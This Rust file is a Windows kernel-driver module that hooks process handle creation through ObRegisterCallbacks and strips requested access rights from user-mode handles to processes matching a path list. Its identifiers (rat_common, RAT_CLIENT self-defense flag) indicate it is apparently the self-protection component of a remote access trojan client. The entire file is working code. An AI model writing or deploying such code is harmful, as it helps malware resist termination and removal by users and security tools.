use core::ffi::c_void;
use core::sync::atomic::Ordering;
use core::{mem, ptr, slice};

use rat_common::utils::DropGuard;
use rat_common::windows::kernel::KernelHandoff;
use wdk::nt_success;
use wdk_sys::_MODE::UserMode;
use wdk_sys::_OB_PREOP_CALLBACK_STATUS::OB_PREOP_SUCCESS;
use wdk_sys::ntddk::{
    ExFreePool, ExGetPreviousMode, IoGetCurrentProcess, ObRegisterCallbacks, PsGetCurrentProcessId,
    PsGetProcessId, RtlInitUnicodeString, SeLocateProcessImageName,
};
use wdk_sys::{
    OB_CALLBACK_REGISTRATION, OB_FLT_REGISTRATION_VERSION, OB_OPERATION_HANDLE_CREATE,
    OB_OPERATION_REGISTRATION, OB_PRE_OPERATION_INFORMATION, OB_PREOP_CALLBACK_STATUS,
    PsProcessType, UNICODE_STRING,
};
use widestring::U16Str;

use crate::global::{ALTITUDE, OBJ_PATH_AHO_CORASICK, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE_FLAG};
use crate::info;

pub fn ob_register_callbacks(_: &KernelHandoff) -> anyhow::Result<*mut c_void> {
    let mut altitude = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut altitude, ALTITUDE.as_ptr());
    }

    let mut object_operations = [OB_OPERATION_REGISTRATION {
        ObjectType: unsafe { PsProcessType },
        Operations: OB_OPERATION_HANDLE_CREATE,
        PreOperation: Some(process_preop_callback),
        PostOperation: None,
    }];

    let mut object_callbacks = OB_CALLBACK_REGISTRATION {
        Version: OB_FLT_REGISTRATION_VERSION as u16,
        OperationRegistrationCount: object_operations.len() as u16,
        Altitude: altitude,
        RegistrationContext: ptr::null_mut(),
        OperationRegistration: object_operations.as_mut_ptr(),
    };

    let mut handle = ptr::null_mut();
    let status = unsafe { ObRegisterCallbacks(&mut object_callbacks, &mut handle) };
    anyhow::ensure!(
        nt_success(status),
        "ObRegisterCallbacks error: 0x{status:X}",
    );

    Ok(handle)
}

unsafe extern "C" fn process_preop_callback(
    _: *mut c_void,
    info: *mut OB_PRE_OPERATION_INFORMATION,
) -> OB_PREOP_CALLBACK_STATUS {
    if let Some(info) = unsafe { info.as_mut() }
        && unsafe {
            info.__bindgen_anon_1.__bindgen_anon_1.KernelHandle() == 0
                && i32::from(ExGetPreviousMode()) == UserMode
        }
        && let Some(ac) = unsafe { OBJ_PATH_AHO_CORASICK.load(Ordering::Acquire).as_ref() }
    {
        if unsafe { PsGetCurrentProcessId() == PsGetProcessId(info.Object.cast()) } {
            return OB_PREOP_SUCCESS;
        }

        let mut target = ptr::null_mut();
        let status = unsafe { SeLocateProcessImageName(info.Object.cast(), &mut target) };
        let guard = DropGuard::new(target, |s| unsafe {
            ExFreePool(s.cast());
        });

        if let Some(target) = unsafe { target.as_ref() }
            && nt_success(status)
        {
            let target =
                unsafe { slice::from_raw_parts(target.Buffer.cast(), usize::from(target.Length)) };

            if ac.find(target).is_some()
                && let Some(parameters) = unsafe { info.Parameters.as_mut() }
            {
                let mut source = ptr::null_mut();
                let status =
                    unsafe { SeLocateProcessImageName(IoGetCurrentProcess(), &mut source) };
                let guard = DropGuard::new(source, |s| unsafe {
                    ExFreePool(s.cast());
                });

                if let Some(source) = unsafe { source.as_ref() }
                    && nt_success(status)
                {
                    let name = U16Str::from_slice(unsafe {
                        slice::from_raw_parts(
                            source.Buffer,
                            usize::from(source.Length) / mem::size_of::<u16>(),
                        )
                    });

                    let access = unsafe { &mut parameters.CreateHandleInformation.DesiredAccess };
                    let protected_flags =
                        RAT_CLIENT_OBJ_PATH_SELF_DEFENSE_FLAG.load(Ordering::Acquire);
                    if *access & protected_flags != 0 {
                        *access &= !protected_flags;

                        let pid = unsafe { PsGetCurrentProcessId() } as u64;
                        info!("Modified process operation from process {pid} ({name:?})");
                    }
                }

                drop(guard);
            }
        }

        drop(guard);
    }

    OB_PREOP_SUCCESS
}
